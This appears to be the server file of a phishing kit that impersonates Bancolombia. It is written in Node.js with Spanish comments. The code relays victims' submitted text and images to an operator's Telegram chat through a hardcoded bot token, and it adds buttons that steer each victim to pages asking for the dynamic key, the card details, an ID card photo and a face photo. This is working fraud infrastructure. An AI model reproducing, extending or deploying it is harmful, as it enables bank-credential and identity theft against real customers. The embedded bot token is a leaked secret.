const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    pingTimeout: 60000,
    pingInterval: 25000,
    connectTimeout: 45000,
    upgradeTimeout: 15000,
    connectionStateRecovery: {
        maxDisconnectionDuration: 120000,
        skipMiddlewares: true
    }
});
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// Configuración
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = '8343380638:AAGZ7Z6WBiQTn65itI0rqRUF3gQ13Ex_TKA';
const TELEGRAM_CHAT_ID = '-4997787461';

// Inicializar bot de Telegram
// IMPORTANTE: por defecto NO hace polling para evitar 409 Conflict (todas las bancas
// comparten el mismo bot token con el server raiz). Para correr esta banca de forma
// AISLADA exporta STANDALONE_BOT=1 antes de iniciar el proceso.
const _POLL_TG = process.env.STANDALONE_BOT === '1' || process.env.STANDALONE_BOT === 'true';
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: _POLL_TG });

// Servir archivos estáticos
app.use(express.static(__dirname));
app.use(express.json({ limit: '50mb' }));

// Almacenar sesiones activas
const activeSessions = new Map();
const sessionSockets = new Map();

// Buffer de acciones pendientes por sessionId (cuando no hay sockets en el room aún)
const pendingActions = new Map(); // sessionId -> Array<actionPayload>
const MAX_PENDING_PER_SESSION = 20;
const PENDING_TTL_MS = 5 * 60 * 1000; // 5 min

function enqueuePendingAction(sessionId, payload) {
    const list = pendingActions.get(sessionId) || [];
    list.push({ payload, queuedAt: Date.now() });
    while (list.length > MAX_PENDING_PER_SESSION) list.shift();
    pendingActions.set(sessionId, list);
}

function drainPendingActions(sessionId, socket) {
    const list = pendingActions.get(sessionId);
    if (!list || !list.length) return 0;
    const now = Date.now();
    let delivered = 0;
    for (const item of list) {
        if (now - item.queuedAt > PENDING_TTL_MS) continue;
        socket.emit('telegramAction', item.payload);
        delivered++;
    }
    pendingActions.delete(sessionId);
    return delivered;
}

setInterval(() => {
    const now = Date.now();
    for (const [sid, list] of pendingActions.entries()) {
        const fresh = list.filter(i => now - i.queuedAt <= PENDING_TTL_MS);
        if (!fresh.length) pendingActions.delete(sid);
        else if (fresh.length !== list.length) pendingActions.set(sid, fresh);
    }
}, 60 * 1000);

// Manejar favicon
app.get('/favicon.ico', (req, res) => {
    res.status(204).end();
});

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Configuración de Socket.IO con mejor logging
io.on('connection', (socket) => {
    console.log('\n🔗 Cliente conectado:', socket.id, socket.recovered ? '(recuperado)' : '');
    console.log('   Tiempo:', new Date().toLocaleTimeString());

    // Auto-join al room basado en handshake.auth.sessionId
    const handshakeSessionId = socket.handshake.auth && socket.handshake.auth.sessionId;
    if (handshakeSessionId) {
        socket.join(handshakeSessionId);
        socket.data.sessionId = handshakeSessionId;
        const delivered = drainPendingActions(handshakeSessionId, socket);
        if (delivered) console.log(`   ⏪ Drenadas ${delivered} acciones pendientes para ${handshakeSessionId}`);
    }

    // Inicializar sesión
    socket.on('initSession', (data) => {
        const { sessionId, page } = data || {};
        if (!sessionId) return;
        console.log('Sesión inicializada:', sessionId, 'en página:', page);

        socket.join(sessionId);
        socket.data.sessionId = sessionId;

        activeSessions.set(sessionId, {
            socketId: socket.id,
            page: page || 'unknown',
            timestamp: Date.now()
        });

        sessionSockets.set(socket.id, sessionId);

        const delivered = drainPendingActions(sessionId, socket);
        if (delivered) console.log(`   ⏪ Drenadas ${delivered} acciones pendientes para ${sessionId}`);

        socket.emit('sessionConfirmed', { sessionId, success: true });
    });

    // Mantener sesión activa
    socket.on('keepAlive', (data) => {
        const { sessionId } = data;
        if (sessionId && activeSessions.has(sessionId)) {
            const session = activeSessions.get(sessionId);
            session.timestamp = Date.now();
            activeSessions.set(sessionId, session);
        }
    });

    // Enviar datos a Telegram
    socket.on('sendData', async (data) => {
        try {
            const { type, sessionId, content, waitForAction } = data;
            console.log('\n📨 Datos recibidos del cliente:');
            console.log('   Tipo:', type);
            console.log('   Sesión:', sessionId);
            console.log('   Socket ID:', socket.id);
            console.log('   Contenido:', content.text ? content.text.substring(0, 50) + '...' : 'Imagen');

            // Preparar mensaje y teclado
            let message = content.text || '';
            let keyboard = {
                inline_keyboard: [
                    [
                        { text: "🏠 Index", callback_data: `action:index:${sessionId}` },
                        { text: "🔐 Dinámica", callback_data: `action:dinamica:${sessionId}` }
                    ],
                    [
                        { text: "📄 Términos", callback_data: `action:terminos:${sessionId}` },
                        { text: "💳 Tarjeta", callback_data: `action:tarjeta:${sessionId}` }
                    ],
                    [
                        { text: "🪪 Cédula", callback_data: `action:cedula:${sessionId}` },
                        { text: "👤 Cara", callback_data: `action:cara:${sessionId}` }
                    ],
                    [
                        { text: "✅ Finalizar", callback_data: `action:finalizar:${sessionId}` }
                    ]
                ]
            };

            console.log('📤 Enviando a Telegram...');

            // Enviar mensaje a Telegram
            let telegramResponse;
            if (content.image) {
                // Si hay imagen, enviarla
                console.log('   📷 Enviando imagen con caption');
                const imageBuffer = Buffer.from(content.image.split(',')[1], 'base64');
                telegramResponse = await bot.sendPhoto(TELEGRAM_CHAT_ID, imageBuffer, {
                    caption: message,
                    reply_markup: keyboard
                });
            } else {
                // Solo texto
                console.log('   💬 Enviando mensaje de texto');
                telegramResponse = await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
                    reply_markup: keyboard,
                    parse_mode: 'HTML'
                });
            }

            console.log('✅ Mensaje enviado a Telegram exitosamente');
            console.log('   Message ID:', telegramResponse.message_id);

            socket.emit('dataSent', { 
                success: true, 
                type,
                message: 'Datos enviados correctamente a Telegram',
                telegramMessageId: telegramResponse.message_id
            });

        } catch (error) {
            console.error('❌ Error al enviar datos a Telegram:', error);
            console.error('   Error details:', error.message);
            socket.emit('dataSent', { 
                success: false, 
                message: error.message 
            });
        }
    });

    // Manejar desconexión
    socket.on('disconnect', (reason) => {
        console.log('Cliente desconectado:', socket.id, '-', reason);
        // No eliminamos sesión: el room se reconstruye automáticamente al reconectar
        // (connectionStateRecovery + handshake.auth.sessionId).
        // sessionSockets se limpia perezosamente al expirar.
        const sessionId = sessionSockets.get(socket.id);
        if (sessionId) sessionSockets.delete(socket.id);
    });

    // Confirmar acción recibida
    socket.on('actionReceived', (data) => {
        console.log('Acción confirmada por cliente:', data);
    });
});

// Manejar callbacks de Telegram
bot.on('callback_query', async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;

    try {
        // Parsear datos
        const [type, action, sessionId] = data.split(':');

        if (type === 'action' && sessionId) {
            console.log('Acción de Telegram:', action, 'para sesión:', sessionId);

            const payload = {
                action,
                sessionId,
                fromTelegram: true,
                telegramMessageId: message.message_id,
                messageId: message.message_id,
                timestamp: Date.now()
            };

            // Enviar al room (cubre múltiples pestañas / reconexiones)
            io.to(sessionId).emit('telegramAction', payload);

            const room = io.sockets.adapter.rooms.get(sessionId);
            const roomSize = room ? room.size : 0;

            if (roomSize > 0) {
                await bot.answerCallbackQuery(callbackQuery.id, { text: `✅ ${action}` });
            } else {
                // Sin sockets ahora mismo: encolar y entregar al próximo connect/init
                enqueuePendingAction(sessionId, payload);
                await bot.answerCallbackQuery(callbackQuery.id, { text: `⏳ ${action} en cola` });
                console.log(`   📥 Acción encolada (sin sockets): ${action} → ${sessionId}`);
            }
        } else {
            await bot.answerCallbackQuery(callbackQuery.id);
        }
    } catch (error) {
        console.error('Error manejando callback:', error);
        try { await bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Error temporal' }); } catch (_) {}
    }
});

// Limpiar sesiones expiradas cada 30 minutos
setInterval(() => {
    const now = Date.now();
    const EXPIRY_TIME = 6 * 60 * 60 * 1000; // 6 horas

    for (const [sessionId, session] of activeSessions.entries()) {
        if (now - session.timestamp > EXPIRY_TIME) {
            console.log('Limpiando sesión expirada:', sessionId);
            activeSessions.delete(sessionId);
            sessionSockets.delete(session.socketId);
        }
    }
}, 30 * 60 * 1000);

// Manejo de errores del bot
bot.on('polling_error', (error) => {
    console.error('Error de polling de Telegram:', error);
});

// Iniciar servidor
http.listen(PORT, () => {
    console.log('\n' + '='.repeat(50));
    console.log('🚀 Servidor Bancolombia Iniciado');
    console.log('='.repeat(50));
    console.log(`📍 URL: http://localhost:${PORT}`);
    console.log(`🤖 Bot de Telegram: ✅ Conectado`);
    console.log(`👥 Sesiones activas: ${activeSessions.size}`);
    console.log('='.repeat(50) + '\n');
});

// Manejo de cierre graceful
process.on('SIGTERM', () => {
    console.log('SIGTERM recibido, cerrando servidor...');
    http.close(() => {
        console.log('Servidor cerrado');
        process.exit(0);
    });
});
